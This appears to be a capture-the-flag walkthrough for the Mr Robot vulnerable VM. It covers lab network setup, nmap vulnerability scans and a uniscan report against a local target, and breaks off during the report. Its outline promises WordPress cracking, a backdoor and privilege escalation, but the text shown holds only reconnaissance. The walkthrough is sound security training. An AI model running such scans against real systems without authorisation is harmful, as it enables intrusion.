<H1>Mr Robot</H1>
<p></p>
<H2>What is it?</H2>
<p></p>
Mr Robot is a vulnerable VM that can be downloaded from <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" rel="nofollow">VulnHub</a> so that you can host it locally or you can complete it on <a href="https://tryhackme.com/room/mrrobot" rel="nofollow">TryHackMe</a>. Mr Robot is a free room on TryHackMe so anyone can do it without needing to subscribe (however I do strongly recommend subscribing to TryHackMe). The difference being that when you host the VM locally it will run faster and your brute forcing will occur quicker because you aren't tunneling through a VPN; however, you don't have the bonus of submitting the flags as you find them.
<p></p>
Mr Robot is a themed box on the TV show also called Mr Robot, it contains 3 flags (web flag, user flag and root flag) and has different ways of completing the box to achieve the same outcome. Doing this box you will cover the following areas:
<p></p>
<H5>Enumeration</H5>
- Network Scanning (Nmap)
<H5>Web Recon</H5>
- Recon (Nikto,gobuster,dirb,uniscan)
<br>
- Web directory traversal/file access
<H5>Breaking into a badly configured login page</H5>
- Setting up a dictionary file for username and password enumeration/cracking
<br>
- WordPress password cracking (wpscan,hydra)
<H5>Generating Backdoors</H5>
- Generate PHP Backdoor (Msfvenom)
<br>
- Upload and execute a backdoor
<H5>Catching the reverse conection on your host</H5>
- Reverse connection (Metasploit)
<H5>Identifying and cracking a hash</H5>
- Getting a hash and decrypting it
<H5>Getting a TTY shell</H5>
- Import python one-liner for proper TTY shell
<H5>Privilege Escalation</H5>
- One liner, WinPEAS,
<br>
- binary, dirtysock
<p></p>
All flags have the following flag format:
<p></p>
key-1-of-3.txt
<br>
And when opened look like a random string of characters eg. ABCDENOASFINEAUINFAOPDSNFRUENPANFD
<p></p>
As stated before one flag is located on the website itself, one is located in the user folder and the final is located in the root folder.
<p></p>
<H2>Locally Hosting the VM</H2>
<details>
    <summary></summary>
<p></p>
The first thing you need to do is download the mrRobot.ova file from <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" rel="nofollow">VulnHub</a> (<a href="https://download.vulnhub.com/mrrobot/mrRobot.ova" rel="nofollow">Download link</a>).
<br>
Now that you have the .ova file you need open it in either <a href="https://www.virtualbox.org/" rel="nofollow">Virtual Box</a> or <a href="https://www.vmware.com/au/products/workstation-player.html" rel="nofollow">VMWare</a>.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/2429ae9e3f58140ed5905513114b710f0153067e/Starting_Point/VulnHub/MrRobot/images/open.png"><br>
</div>
<p></p>
This will then direct you to the import screen, give the VM a name and store it in a folder on your system somewhere.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/2429ae9e3f58140ed5905513114b710f0153067e/Starting_Point/VulnHub/MrRobot/images/import.png"><br>
</div>
<p></p>
This will then import the machine and you will be able to see it on the left hand panel once completed, the last thing you need to do is confirm the network settings. Below you can see that I have highlighted the network setting for the VM, it should be Host-only.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/2429ae9e3f58140ed5905513114b710f0153067e/Starting_Point/VulnHub/MrRobot/images/bridged.png"><br>
</div>
<p></p>
If it isn't set as Host-only you can click on the network which will bring you into network settings as displayed below.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/2429ae9e3f58140ed5905513114b710f0153067e/Starting_Point/VulnHub/MrRobot/images/network.png"><br>
</div>
<p></p>
You can now start your Mr Robot VM and let it run, you don't need to do anything further with it.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/2429ae9e3f58140ed5905513114b710f0153067e/Starting_Point/VulnHub/MrRobot/images/logon.png"><br>
</div>
<p></p>
We now need to make some changes to our penetration VM, looking at the settings we can see that there is only one network adapter that is set to NAT.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/17c7433328d45f62ef541af78f404d6556d848be/Starting_Point/VulnHub/MrRobot/images/penbox.png"><br>
</div>
<p></p>
We can add another adapter though the settings to do this right click on the VM name in the left panel.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/17c7433328d45f62ef541af78f404d6556d848be/Starting_Point/VulnHub/MrRobot/images/settings.png"><br>
</div>
<p></p>
Next we need to add another adapter, to do this we click on add at the bottom of the settings screen.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/17c7433328d45f62ef541af78f404d6556d848be/Starting_Point/VulnHub/MrRobot/images/add.png"><br>
</div>
<p></p>
We then click on Network Adapter then click finish.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/17c7433328d45f62ef541af78f404d6556d848be/Starting_Point/VulnHub/MrRobot/images/networkadapter.png"><br>
</div>
<p></p>
We can see that Network Adapter 2 has been created, we need to click on that adapter and select Host-only followed by ok.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/17c7433328d45f62ef541af78f404d6556d848be/Starting_Point/VulnHub/MrRobot/images/adapter2.png"><br>
</div>
<p></p>
Now that we have done this process we can start our penetration VM and begin the challenge. The reason that I do it this way is so that my penetration VM keeps internet connection and has a direct link to the target VM (mrRobot). If we put both VM's on Host-only our penetration VM would lose internet connectivity. 
<br>
We can confirm that the adapter is working by logging into our penetration VM and running the following command:
<p></p>

```
sudo ifconfig
```

<p></p>
Which returns something like this:
<p></p>

```
❯ sudo ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.191.129  netmask 255.255.255.0  broadcast 192.168.191.255
        inet6 fe80::11ec:b5d:f22:834f  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:df:18:d9  txqueuelen 1000  (Ethernet)
        RX packets 24843  bytes 33147054 (31.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10896  bytes 920671 (899.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.125.134  netmask 255.255.255.0  broadcast 192.168.125.255
        inet6 fe80::744b:c7cf:2382:75d3  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:df:18:e3  txqueuelen 1000  (Ethernet)
        RX packets 5  bytes 875 (875.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 34  bytes 2534 (2.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 25070  bytes 14986245 (14.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25070  bytes 14986245 (14.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

<p></p>
We can see that eth1 has been added as interface and it has an ip next to inet.
<p></p>
We can now begin hacking our target machine.
<p></p>
The process is basically identical for Virtual Box however I prefer using VMWare.

</details>


<hr>
<p></p>
<H2>Walkthrough</H2>
<p></p>
<details>
    <summary></summary>
<p></p>
Our first step in this box is to enumerate the network IOT locate the VM. We do this using <kbd>nmap</kbd> however there are some additional flags and steps we use. The command we will run first is:
<p></p>

```
nmap -e eth1 -T5 192.168.125.0/24
```

<p></p>
Looking at this command we used the <kbd>-e</kbd> flag to let nmap know which interface we want to use for the scan, the <kbd>-T5</kbd> flag tells nmap to do the fastest scan possible and the network we scanned against was the network we identified when we ran <kbd>ifconfig</kbd>.
<br>
This command returns:
<p></p>

```
❯ nmap -e eth1 -T5 192.168.125.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-08 13:29 AEST
Nmap scan report for 192.168.125.132
Host is up (0.016s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https

Nmap scan report for 192.168.125.134
Host is up (0.035s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
111/tcp open  rpcbind
```

<p></p>
Looking through the results we can identify our own ip address <kbd>192.168.125.134</kbd> and one other ip <kbd>192.168.125.132</kbd> we can therefore determine that the second ip is our target VM. Time for further enumeration with nmap. This time the command will look like this:
<p></p>

```
sudo nmap -e eth1 -A -vvv --script vuln -oN nmap.txt 192.168.125.132
```

<p></p>
For this command, we use the <kbd>-e</kbd> flag to direct nmap to our desired network interface, ,<kbd>-A</kbd> to run all scripts, <kbd>-vvv</kbd> to give very verbose output, <kbd>--script vuln</kbd> to run the vulnerability script against the machine, this is extremely helpful and does a lot of enumeration for us which we can see in the output, <kbd>-oN nmap.txt</kbd> outputs the scan to a text file se we can refer to it later and finally the ip address we wish to scan.
This command outputs the following:
<p></p>


```
# Nmap 7.91 scan initiated Thu Jul  8 13:41:13 2021 as: nmap -e eth1 -A -vvv --script vuln -oN nmap.txt 192.168.125.132
Nmap scan report for 192.168.125.132
Host is up, received arp-response (0.0019s latency).
Scanned at 2021-07-08 13:41:24 AEST for 94s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 64
80/tcp  open   http     syn-ack ttl 64 Apache httpd
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.125.132
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.125.132:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/BASE_URL+%22/live/
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/js/BASE_URL+%22/live/
|     Form id: 
|     Form action: http://192.168.125.132/
|     
|     Path: http://192.168.125.132:80/wp-login.php
|     Form id: loginform
|_    Form action: http://192.168.125.132/wp-login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.125.132
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: https://192.168.125.132:443/js/BASE_URL
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/js/BASE_URL
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://192.168.125.132:443/
|     
|     Path: https://192.168.125.132:443/wp-login.php
|     Form id: loginform
|_    Form action: https://192.168.125.132:443/wp-login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_sslv2-drown: 
MAC Address: 00:0C:29:43:37:0E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/8%OT=80%CT=22%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=60E
OS:67442%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8
OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B
OS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.072 days (since Thu Jul  8 11:59:55 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   1.89 ms 192.168.125.132

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  8 13:42:58 2021 -- 1 IP address (1 host up) scanned in 105.32 seconds
```

<p></p>
Looking through the results we can see a lot of interesting information and a lot of enumeration that has been done for us just by using the vuln script.
<br>
We can see there are 3 ports, 22 (ssh), 80 (http), 443 (https).
<br>
The http enumeration is also extremely helpful as it has carried out the job of gobuster or dirb.
<p></p>

```
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
```

<p></p>
From this output we can see our website enumeration is done and we can see that there are a couple of files and a wordpress (version 4.3.1) hosted.
<p></p>
Since we ran the script to do enumeration for us we don't need to carry out any further enumeration ie. gobuster, dirb, uniscan however I will include them for your information below.
<p></p>



<details>
    <summary>Further Enumeration</summary>
<p></p>

<details>
    <summary>uniscan</summary>
<p></p>
Uniscan is a default scanner that comes with ParrotOS and kali, it has a very simple GUI interface:
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/acd6c27914258430c5418614a4129b71f690d48d/Starting_Point/VulnHub/MrRobot/images/uniscan.png"><br>
</div>
<p></p>
You can see that i have imputed the target ip address and selected the following options:
<br>
- Check Directory
<br>
- Check Files
<br>
- Check /robots.txt
<br>
- Dynamic tests
<br>
- Static tests
<br>
- Web Fingerprint
<br>
- Server Fingerprint
<p></p>
Uniscan creates a .html report in /usr/share/uniscan/reports/IPADDRESS.html
<p></p>
You can view this report by running:
<p></p>

```
firefox /usr/share/uniscan/reports/192.168.125.132 &
```

<p></p>
My report looks like <a href="https://github.com/Shadow-Admins/Cyber_Club/blob/main/Starting_Point/VulnHub/MrRobot/files/192.168.125.132.html" rel="nofollow">this</a>.
To see it correctly you would need to copy the code into a .html file then open it with firefox to look like this.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/4196fbf8efbffb56164027ae43bc4d0ca5eae580/Starting_Point/VulnHub/MrRobot/images/uniscanreport.png"><br>
</div>
<p></p>
The report information is:

```
####################################
# Uniscan project                  #
# http://uniscan.sourceforge.net/  #
####################################
V. 6.3


Scan date: 8-7-2021 14:58:19
===================================================================================================
| Domain: http://192.168.125.132/
| Server: Apache
| IP: 192.168.125.132
===================================================================================================
===================================================================================================
| Looking for Drupal plugins/modules
| 
===================================================================================================
| WEB SERVICES
| 
===================================================================================================
| FAVICON.ICO
| 
| Web service Found (favicon.ico): Zero byte favicon
===================================================================================================
| ERROR INFORMATION
| 
|          Page not found | user&#039;s Blog!    Skip to content    user&#039;s Blog! Just another WordPress site Menu and widgets         Search for:    Recent CommentsArchives  Categories No categories Meta Log in Entries RSS Comments RSS WordPress.org          Oops! That page can&rsquo;t be found.   It looks like nothing was found at this location. Maybe try a search?   Search for:           Proudly powered by WordPress   
|  400 Bad Request Bad Request Your browser sent a request that this server could not understand. 
===================================================================================================
| TYPE ERROR
| 
===================================================================================================
| SERVER MOBILE
| 
===================================================================================================
| LANGUAGE
| 
===================================================================================================
| INTERESTING STRINGS IN HTML
| 
===================================================================================================
| WHOIS
| 
| 
| 
| #
| 
| # ARIN WHOIS data and services are subject to the Terms of Use
| 
| # available at: https://www.arin.net/resources/registry/whois/tou/
| 
| #
| 
| # If you see inaccuracies in the results, please report at
| 
| # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
| 
| #
| 
| # Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
| 
| #
| 
| 
| 
| 
| 
| NetRange:       192.168.0.0 - 192.168.255.255
| 
| CIDR:           192.168.0.0/16
| 
| NetName:        PRIVATE-ADDRESS-CBLK-RFC1918-IANA-RESERVED
| 
| NetHandle:      NET-192-168-0-0-1
| 
| Parent:         NET192 (NET-192-0-0-0-0)
| 
| NetType:        IANA Special Use
| 
| OriginAS:       
| 
| Organization:   Internet Assigned Numbers Authority (IANA)
| 
| RegDate:        1994-03-15
| 
| Updated:        2013-08-30
| 
| Comment:        These addresses are in use by many millions of independently operated networks, which might be as small as a single computer connected to a home gateway, and are automatically configured in hundreds of millions of devices.  They are only intended for use within a private context  and traffic that needs to cross the Internet will need to use a different, unique address.
| 
| Comment:        
| 
| Comment:        These addresses can be used by anyone without any need to coordinate with IANA or an Internet registry.  The traffic from these addresses does not come from ICANN or IANA.  We are not the source of activity you may see on logs or in e-mail records.  Please refer to http://www.iana.org/abuse/answers
| 
| Comment:        
| 
| Comment:        These addresses were assigned by the IETF, the organization that develops Internet protocols, in the Best Current Practice document, RFC 1918 which can be found at:
| 
| Comment:        http://datatracker.ietf.org/doc/rfc1918
| 
| Ref:            https://rdap.arin.net/registry/ip/192.168.0.0
| 
| 
| 
| 
| 
| 
| 
| OrgName:        Internet Assigned Numbers Authority
| 
| OrgId:          IANA
| 
| Address:        12025 Waterfront Drive
| 
| Address:        Suite 300
| 
| City:           Los Angeles
| 
| StateProv:      CA
| 
| PostalCode:     90292
| 
| Country:        US
| 
| RegDate:        
| 
| Updated:        2012-08-31
| 
| Ref:            https://rdap.arin.net/registry/entity/IANA
| 
| 
| 
| 
| 
| OrgAbuseHandle: IANA-IP-ARIN
| 
| OrgAbuseName:   ICANN
| 
| OrgAbusePhone:  +1-310-301-5820 
| 
| OrgAbuseEmail:  abuse@iana.org
| 
| OrgAbuseRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN
| 
| 
| 
| OrgTechHandle: IANA-IP-ARIN
| 
| OrgTechName:   ICANN
| 
| OrgTechPhone:  +1-310-301-5820 
| 
| OrgTechEmail:  abuse@iana.org
| 
| OrgTechRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN
| 
| 
| 
| 
| 
| #
| 
| # ARIN WHOIS data and services are subject to the Terms of Use
| 
| # available at: https://www.arin.net/resources/registry/whois/tou/
| 
| #
| 
| # If you see inaccuracies in the results, please report at
| 
| # https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
| 
| #
| 
| # Copyright 1997-2021, American Registry for Internet Numbers, Ltd.
| 
| #
| 
| 
| 
===================================================================================================
| BANNER GRABBING: 
===================================================================================================
===================================================================================================
| PING
| 
| PING 192.168.125.132 (192.168.125.132) 56(84) bytes of data.
| 64 bytes from 192.168.125.132: icmp_seq=1 ttl=64 time=0.313 ms
| 64 bytes from 192.168.125.132: icmp_seq=2 ttl=64 time=1.24 ms
| 64 bytes from 192.168.125.132: icmp_seq=3 ttl=64 time=0.346 ms
| 64 bytes from 192.168.125.132: icmp_seq=4 ttl=64 time=0.420 ms
| 
| --- 192.168.125.132 ping statistics ---
| 4 packets transmitted, 4 received, 0% packet loss, time 3036ms
| rtt min/avg/max/mdev = 0.313/0.580/1.242/0.384 ms
===================================================================================================
| TRACEROUTE
| 
| traceroute to 192.168.125.132 (192.168.125.132), 30 hops max, 60 byte packets
|  1  * * *
|  2  * * *
|  3  * * *
|  4  * * *
|  5  * * *
|  6  * * *
|  7  * * *
|  8  * * *
|  9  * * *
| 10  * * *
| 11  * * *
| 12  * * *
| 13  * * *
| 14  * * *
| 15  * * *
| 16  * * *
| 17  * * *
| 18  * * *
| 19  * * *
| 20  * * *
| 21  * * *
| 22  * * *
| 23  * * *
| 24  * * *
| 25  * * *
| 26  * * *
| 27  * * *
| 28  * * *
| 29  * * *
| 30  * * *
===================================================================================================
| NSLOOKUP
| 
| Server:		192.168.191.2
| Address:	192.168.191.2#53
| 
| ** server can't find 132.125.168.192.in-addr.arpa: NXDOMAIN
===================================================================================================
| NMAP
| 
| Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-08 14:58 AEST
| NSE: Loaded 153 scripts for scanning.
| NSE: Script Pre-scanning.
| Initiating NSE at 14:58
| Completed NSE at 14:58, 0.00s elapsed
| Initiating NSE at 14:58
| Completed NSE at 14:58, 0.00s elapsed
| Initiating NSE at 14:58
| Completed NSE at 14:58, 0.00s elapsed
| Initiating ARP Ping Scan at 14:58
| Scanning 192.168.125.132 [1 port]
| Completed ARP Ping Scan at 14:58, 0.07s elapsed (1 total hosts)
| Initiating Parallel DNS resolution of 1 host. at 14:58
| Completed Parallel DNS resolution of 1 host. at 14:59, 6.53s elapsed
| Initiating SYN Stealth Scan at 14:59
| Scanning 192.168.125.132 [1000 ports]
| Discovered open port 443/tcp on 192.168.125.132
| Discovered open port 80/tcp on 192.168.125.132
| Completed SYN Stealth Scan at 14:59, 4.59s elapsed (1000 total ports)
| Initiating Service scan at 14:59
| Scanning 2 services on 192.168.125.132
| Completed Service scan at 14:59, 12.03s elapsed (2 services on 1 host)
| Initiating OS detection (try #1) against 192.168.125.132
| NSE: Script scanning 192.168.125.132.
| Initiating NSE at 14:59
| Completed NSE at 14:59, 0.26s elapsed
| Initiating NSE at 14:59
| Completed NSE at 14:59, 0.04s elapsed
| Initiating NSE at 14:59
| Completed NSE at 14:59, 0.00s elapsed
| Nmap scan report for 192.168.125.132
| Host is up (0.0017s latency).
| Not shown: 997 filtered ports
| PORT    STATE  SERVICE  VERSION
| 22/tcp  closed ssh
| 80/tcp  open   http     Apache httpd
| |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| | http-methods: 
| |_  Supported Methods: GET HEAD POST OPTIONS
| |_http-server-header: Apache
| |_http-title: Site doesn't have a title (text/html).
| 443/tcp open   ssl/http Apache httpd
| |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| | http-methods: 
| |_  Supported Methods: GET HEAD POST OPTIONS
| |_http-server-header: Apache
| |_http-title: Site doesn't have a title (text/html).
| | ssl-cert: Subject: commonName=www.example.com
| | Issuer: commonName=www.example.com
| | Public Key type: rsa
| | Public Key bits: 1024
| | Signature Algorithm: sha1WithRSAEncryption
| | Not valid before: 2015-09-16T10:45:03
| | Not valid after:  2025-09-13T10:45:03
| | MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| |_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| MAC Address: 00:0C:29:43:37:0E (VMware)
| Device type: general purpose
| Running: Linux 3.X|4.X
| OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
| OS details: Linux 3.10 - 4.11
| Uptime guess: 0.126 days (since Thu Jul  8 11:58:29 2021)
| Network Distance: 1 hop
| TCP Sequence Prediction: Difficulty=254 (Good luck!)
| IP ID Sequence Generation: All zeros
| 
| TRACEROUTE
| HOP RTT     ADDRESS
| 1   1.75 ms 192.168.125.132
| 
| NSE: Script Post-scanning.
| Initiating NSE at 14:59
| Completed NSE at 14:59, 0.00s elapsed
| Initiating NSE at 14:59
| Completed NSE at 14:59, 0.00s elapsed
| Initiating NSE at 14:59
| Completed NSE at 14:59, 0.00s elapsed
| Read data files from: /usr/bin/../share/nmap
| OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
| Nmap done: 1 IP address (1 host up) scanned in 25.52 seconds
|            Raw packets sent: 2029 (90.970KB) | Rcvd: 19 (1.130KB)
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.125.132/Image/
| [+] CODE: 200 URL: http://192.168.125.132/admin/
| [+] CODE: 200 URL: http://192.168.125.132/feed/
| [+] CODE: 200 URL: http://192.168.125.132/image/
| [+] CODE: 200 URL: http://192.168.125.132/login/
| [+] CODE: 200 URL: http://192.168.125.132/rss/
| [+] CODE: 200 URL: http://192.168.125.132/wp-login/
| [+] CODE: 200 URL: http://192.168.125.132/wp-admin/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.125.132/admin/index.html
| [+] CODE: 200 URL: http://192.168.125.132/admin/index.php
| [+] CODE: 200 URL: http://192.168.125.132/favicon.ico
| [+] CODE: 200 URL: http://192.168.125.132/index.html
| [+] CODE: 200 URL: http://192.168.125.132/index.html%20
| [+] CODE: 200 URL: http://192.168.125.132/index.php
| [+] CODE: 200 URL: http://192.168.125.132/license.txt
| [+] CODE: 200 URL: http://192.168.125.132/readme
| [+] CODE: 200 URL: http://192.168.125.132/readme.html
| [+] CODE: 200 URL: http://192.168.125.132/robots.txt
| [+] CODE: 200 URL: http://192.168.125.132/search/htx/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.125.132/search/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.125.132/search/htx/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.125.132/search/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.125.132/sitemap.xml
===================================================================================================
|
| Check robots.txt:
|
| Check sitemap.xml:
===================================================================================================
|
| Crawler Started:
| Plugin name: FCKeditor upload test v.1 Loaded.
